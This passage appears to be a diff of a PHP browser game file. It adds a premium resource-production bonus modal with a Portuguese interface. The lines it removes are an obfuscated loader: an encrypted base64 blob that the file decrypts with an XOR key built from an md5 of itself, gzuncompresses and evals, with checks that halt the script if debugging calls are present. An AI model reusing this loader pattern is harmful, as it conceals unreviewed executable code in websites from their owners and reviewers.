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";
-$puwljxlm=file_get_contents(__FILE__);
-$usxmles=str_replace($qssoch,"",$puwljxlm);
-if(strpos($usxmles,"ec"."ho")!==false||strpos($usxmles,"pr"."int")!==false||strpos($usxmles,"var_"."dump")!==false||strpos($usxmles,"file_put_"."contents")!==false||strpos($usxmles,"fw"."rite")!==false){die();}
-$fureallsy=str_replace(array($guhhjcxbpr,$dpflaln),array("SP_abe7dd62","KP_271a687c"),$puwljxlm);
-$qzkhtsa=md5($fureallsy);
-$fyalzixxr=hex2bin($dpflaln);
-$xtcihkdto="";
-$vzjjllld=strlen($qzkhtsa);
-for($gfxatf=0;$gfxatf<$vzjjllld;$gfxatf++){
-$xtcihkdto.=chr(ord($fyalzixxr[$gfxatf])^ord($qzkhtsa[$gfxatf]));
+$active_features_overview = [];
+$now_time = time();
+foreach (['wood_production', 'clay_production', 'iron_production'] as $col) {
+    $expires = $user[$col . '_expires'] ?? 0;
+    if ($expires && !is_numeric($expires)) {
+        $expires = strtotime($expires);
+    }
+    if ($expires > $now_time) {
+        $active_features_overview[$col] = [
+            'expires' => $expires,
+            'expires_formatted' => date('d M Y, H:i', $expires),
+            'auto_renew' => !empty($user[$col . '_auto_renew'])
+        ];
+    }
 }
-$vpoote=base64_decode($qssoch);
-$ekxwiiita=strlen($vpoote);
-$qhwjrpvd="";
-$jyxamuvdtx=strlen($xtcihkdto);
-for($gfxatf=0;$gfxatf<$ekxwiiita;$gfxatf++){
-$qhwjrpvd.=$vpoote[$gfxatf]^$xtcihkdto[$gfxatf%$jyxamuvdtx];
-}
-$kcxqoz="gzun"."compress";
-eval('?>' . $kcxqoz($qhwjrpvd) . '<?php ');
+?>
+<script type="text/javascript">
+    window.overviewActiveFeatures = <?= json_encode($active_features_overview) ?>;
+    window.userPremiumPoints = <?= (int) ($ilosc_sz ?? 0) ?>;
+
+    function openProdBonusModal(feature) {
+        const featureInfo = {
+            'wood': {
+                'id': 'wood_production',
+                'name': 'madeira',
+                'title': '+20% na produção de madeira',
+                'img': '/graphic/new/premium/WoodProduction_large.webp',
+                'desc': 'Produza mais 20% de madeira!'
+            },
+            'clay': {
+                'id': 'clay_production',
+                'name': 'argila',
+                'title': '+20% na produção de argila',
+                'img': '/graphic/new/premium/StoneProduction_large.webp',
+                'desc': 'Produza mais 20% de argila!'
+            },
+            'iron': {
+                'id': 'iron_production',
+                'name': 'ferro',
+                'title': '+20% na produção de ferro',
+                'img': '/graphic/new/premium/IronProduction_large.webp',
+                'desc': 'Produza mais 20% de ferro!'
+            }
+        };
+
+        const info = featureInfo[feature];
+        if (!info) return;
+
+        const activeInfo = window.overviewActiveFeatures[info.id];
+        const isActive = !!activeInfo;
+
+        // Populate modal values
+        document.getElementById('pbm-title').textContent = info.title;
+        document.getElementById('pbm-img').src = info.img;
+        document.getElementById('pbm-desc').textContent = info.desc;
+        document.getElementById('pbm-feature-id').value = info.id;
+
+        // Checkmark state
+        document.getElementById('pbm-check').style.display = isActive ? 'block' : 'none';
+
+        // Expiry display
+        const expiryDiv = document.getElementById('pbm-expiry-info');
+        if (isActive) {
+            expiryDiv.style.display = 'block';
+            document.getElementById('pbm-expiry-date').textContent = activeInfo.expires_formatted;
+            document.getElementById('pbm-auto-renew-checkbox').checked = activeInfo.auto_renew;
+        } else {
+            expiryDiv.style.display = 'none';
+        }
+
+        // Action button text
+        const actBtn = document.getElementById('pbm-btn-activate');
+        actBtn.textContent = isActive ? 'PROLONGAR AGORA' : 'ATIVAR AGORA';
+
+        // Hide gift section on start
+        document.getElementById('pbm-gift-section').style.display = 'none';
+        document.getElementById('pbm-gift-recipient').value = '';
+        document.getElementById('pbm-gift-message').style.display = 'none';
+
+        // Update cost display
+        updatePbmCost();
+
+        // Show modal overlay
+        document.getElementById('prodBonusModalOverlay').style.display = 'flex';
+    }
+
+    function closeProdBonusModal() {
+        document.getElementById('prodBonusModalOverlay').style.display = 'none';
+    }
+
+    function updatePbmCost() {
+        const durationSelect = document.getElementById('pbm-duration-select');
+        const duration = parseInt(durationSelect.value);
+        const cost = duration === 90 ? 450 : 150;
+        document.getElementById('pbm-cost-value').textContent = cost;
+    }
+
+    function togglePbmGiftSection() {
+        const section = document.getElementById('pbm-gift-section');
+        section.style.display = section.style.display === 'none' ? 'block' : 'none';
+    }
+
+    function submitPbmActivation() {
+        const featureId = document.getElementById('pbm-feature-id').value;
+        const duration = parseInt(document.getElementById('pbm-duration-select').value);
+        const cost = duration === 90 ? 450 : 150;
+
+        if (window.userPremiumPoints < cost) {
+            alert("Pontos Premium insuficientes!");
+            return;
+        }
+
+        const btn = document.getElementById('pbm-btn-activate');
+        const originalText = btn.textContent;
+        btn.disabled = true;
+        btn.textContent = 'A processar...';
+
+        const formData = new FormData();
+        formData.append('action', 'activate');
+        formData.append('feature', featureId);
+        formData.append('duration', duration);
+
+        fetch('game.php?screen=premium', {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            btn.disabled = false;
+            btn.textContent = originalText;
+            if (data.success) {
+                alert(data.message);
+                window.location.reload();
+            } else {
+                alert(data.message || 'Erro ao ativar a funcionalidade.');
+            }
+        })
+        .catch(err => {
+            btn.disabled = false;
+            btn.textContent = originalText;
+            alert('Erro ao ligar ao servidor.');
+            console.error(err);
+        });
+    }
+
+    function togglePbmAutoRenew(checked) {
+        const featureId = document.getElementById('pbm-feature-id').value;
+        const formData = new FormData();
+        formData.append('action', 'toggle_auto_renew');
+        formData.append('feature', featureId);
+        formData.append('enabled', checked ? '1' : '0');
+
+        fetch('game.php?screen=premium', {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (!data.success) {
+                alert(data.message || 'Erro ao alterar renovação automática.');
+            }
+        })
+        .catch(err => {
+            alert('Erro ao ligar ao servidor.');
+            console.error(err);
+        });
+    }
+
+    function submitPbmGift() {
+        const featureId = document.getElementById('pbm-feature-id').value;
+        const duration = parseInt(document.getElementById('pbm-duration-select').value);
+        const recipient = document.getElementById('pbm-gift-recipient').value.trim();
+        const msgDiv = document.getElementById('pbm-gift-message');
+
+        if (!recipient) {
+            msgDiv.style.color = 'red';
+            msgDiv.textContent = 'Por favor, insere o nome do destinatário.';
+            msgDiv.style.display = 'block';
+            return;
+        }
+
+        msgDiv.style.color = '#8B4513';
+        msgDiv.textContent = 'A processar...';
+        msgDiv.style.display = 'block';
+
+        const formData = new FormData();
+        formData.append('action', 'gift_feature');
+        formData.append('feature', featureId);
+        formData.append('duration', duration);
+        formData.append('recipient', recipient);
+
+        fetch('game.php?screen=premium', {
+            method: 'POST',
+            body: formData
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                msgDiv.style.color = 'green';
+                msgDiv.textContent = data.message;
+                setTimeout(() => {
+                    window.location.reload();
+                }, 1500);
+            } else {
+                msgDiv.style.color = 'red';
+                msgDiv.textContent = data.message || 'Erro ao enviar presente.';
+            }
+        })
+        .catch(err => {
+            msgDiv.style.color = 'red';
+            msgDiv.textContent = 'Erro ao ligar ao servidor.';
+            console.error(err);
+        });
+    }
+</script>
+
+<style type="text/css">
+    #prodBonusModalOverlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        z-index: 10000;
+        display: none;
+        justify-content: center;
+        align-items: center;
+    }
+    .prod-bonus-card {
+        background: #F4E4BC;
+        border: 3px solid #8B4513;
+        border-radius: 10px;
+        width: 380px;
+        box-sizing: border-box;
+        padding: 20px;
+        position: relative;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        text-align: left;
+    }
+    .prod-bonus-header {
+        background: #8B4513;
+        color: white;
+        padding: 10px;
+        text-align: center;
+        border-radius: 5px;
+        font-weight: bold;
+        font-size: 15px;
+        margin-bottom: 15px;
+        margin-top: 10px;
+    }
+    .prod-bonus-close {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #8B4513;
+        color: white;
+        border: none;
+        width: 26px;
+        height: 26px;
+        border-radius: 50%;
+        cursor: pointer;
+        font-size: 15px;
+        line-height: 26px;
+        text-align: center;
+        font-weight: bold;
+    }
+    .prod-bonus-check {
+        position: absolute;
+        top: 45px;
+        right: 20px;
+        font-size: 48px;
+        color: green;
+        line-height: 1;
+        font-weight: bold;
+    }
+    .prod-bonus-img {
+        text-align: center;
+        margin: 20px 0;
+    }
+    .prod-bonus-img img {
+        width: 100px;
+        height: 100px;
+    }
+    .prod-bonus-desc {
+        font-size: 14px;
+        font-weight: bold;
+        color: #3e2723;
+        margin-bottom: 10px;
+        text-align: center;
+    }
+    .prod-bonus-bullets {
+        margin: 10px 0;
+        padding-left: 20px;
+        font-size: 13px;
+        color: #3e2723;
+    }
+    .prod-bonus-controls {
+        margin: 20px 0 15px 0;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        font-size: 13px;
+        color: #3e2723;
+    }
+    .prod-bonus-controls select {
+        padding: 4px;
+        border: 1px solid #8B4513;
+        background: #F4E4BC;
+        color: #3e2723;
+        font-weight: bold;
+    }
+    .prod-bonus-btn-activate {
+        display: block;
+        width: 100%;
+        padding: 10px;
+        background: #228B22;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-weight: bold;
+        cursor: pointer;
+        font-size: 14px;
+        margin-bottom: 10px;
+        transition: 0.2s;
+        text-align: center;
+    }
+    .prod-bonus-btn-activate:hover {
+        background: #006400;
+    }
+    .prod-bonus-auto-renew {
+        background: #E7F3FF;
+        border: 1px solid #2196F3;
+        padding: 10px;
+        margin-bottom: 15px;
+        border-radius: 4px;
+        font-size: 12px;
+        color: #0d47a1;
+    }
+    .prod-bonus-btn-gift {
+        display: block;
+        width: 100%;
+        padding: 8px;
+        background: #8B4513;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        font-weight: bold;
+        cursor: pointer;
+        font-size: 13px;
+        text-align: center;
+    }
+    .prod-bonus-btn-gift:hover {
+        background: #5d330c;
+    }
+</style>
+
+<div id="prodBonusModalOverlay" onclick="if(event.target===this) closeProdBonusModal();">
+    <div class="prod-bonus-card">
+        <button type="button" class="prod-bonus-close" onclick="closeProdBonusModal()">✕</button>
+        
+        <div id="pbm-check" class="prod-bonus-check" style="display: none;">✓</div>
+
+        <div class="prod-bonus-header" id="pbm-title">+20% na produção de madeira</div>
+        
+        <div class="prod-bonus-img">
+            <img id="pbm-img" src="/graphic/new/premium/WoodProduction_large.webp" alt="Resource">
+        </div>
+
+        <div class="prod-bonus-desc" id="pbm-desc">Produza mais 20% de madeira!</div>
+
+        <ul class="prod-bonus-bullets">
+            <li>Em todas as aldeias</li>
+        </ul>
+
+        <div class="prod-bonus-controls">
+            <img src="/graphic/new/premium/time.png" style="vertical-align: middle;" alt="Duration" />
+            <select id="pbm-duration-select" onchange="updatePbmCost()">
+                <option value="90">90 dias</option>
+                <option value="30">30 dias</option>
+            </select>
+            <img src="/graphic/new/premium/coinbag_15x15.png" style="vertical-align: middle;" alt="Coins" />
+            <strong><span id="pbm-cost-value">450</span> pontos</strong>
+        </div>
+
+        <input type="hidden" id="pbm-feature-id" value="">
+
+        <button type="button" class="prod-bonus-btn-activate" id="pbm-btn-activate" onclick="submitPbmActivation()">ATIVAR AGORA</button>
+
+        <!-- Auto-renew & Expiry section -->
+        <div id="pbm-expiry-info" class="prod-bonus-auto-renew" style="display: none;">
+            <label style="cursor: pointer; display: block; font-weight: bold; margin-bottom: 5px;">
+                <input type="checkbox" id="pbm-auto-renew-checkbox" onchange="togglePbmAutoRenew(this.checked)">
+                Prolongar automaticamente
+            </label>
+            <small>Expira a <span id="pbm-expiry-date"></span></small>
+        </div>
+
+        <!-- Comprar como Presente section -->
+        <button type="button" class="prod-bonus-btn-gift" onclick="togglePbmGiftSection()">COMPRAR COMO PRESENTE</button>
+        
+        <div id="pbm-gift-section" style="display: none; margin-top: 15px; border-top: 1px solid #8B4513; padding-top: 15px;">
+            <div style="font-weight: bold; margin-bottom: 5px; font-size: 12px; color: #8B4513;">Comprar como presente:</div>
+            <div style="display: flex; gap: 8px;">
+                <input type="text" id="pbm-gift-recipient" placeholder="Nome do jogador" style="background: rgba(0,0,0,0.1); border: 1px solid #8B4513; padding: 5px; flex-grow: 1; border-radius: 4px; outline: none; font-size: 13px;">
+                <button type="button" onclick="submitPbmGift()" style="background: #8B4513; color: white; border: none; padding: 5px 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 12px;">Enviar</button>
+            </div>
+            <div id="pbm-gift-message" style="margin-top: 5px; font-size: 11px; font-weight: bold; display: none;"></div>
+        </div>
+    </div>
+</div>
